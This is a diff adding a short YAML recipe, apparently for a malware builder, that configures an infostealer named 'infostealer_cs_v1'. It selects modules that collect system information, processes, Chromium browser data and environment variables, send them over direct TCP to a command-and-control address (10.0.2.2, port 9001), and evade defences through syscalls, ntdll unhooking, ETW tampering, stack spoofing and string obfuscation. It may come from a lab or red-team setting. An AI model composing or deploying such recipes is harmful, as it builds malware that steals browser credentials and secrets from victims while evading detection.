@@ -1,0 +1,24 @@
+name: infostealer_cs_v1
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+- collectors/browser_chromium
+- collectors/env_vars
+exfil: exfil/tcp_direct_v2
+arch: arch/sequential
+resources: true
+api_resolve: api_resolve/api_hash_fnv1a
+evasion:
+- evasion/stack_spoof
+- evasion/string_obfuscation
+- evasion/syscalls
+- evasion/ntdll_unhook
+- evasion/etw
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
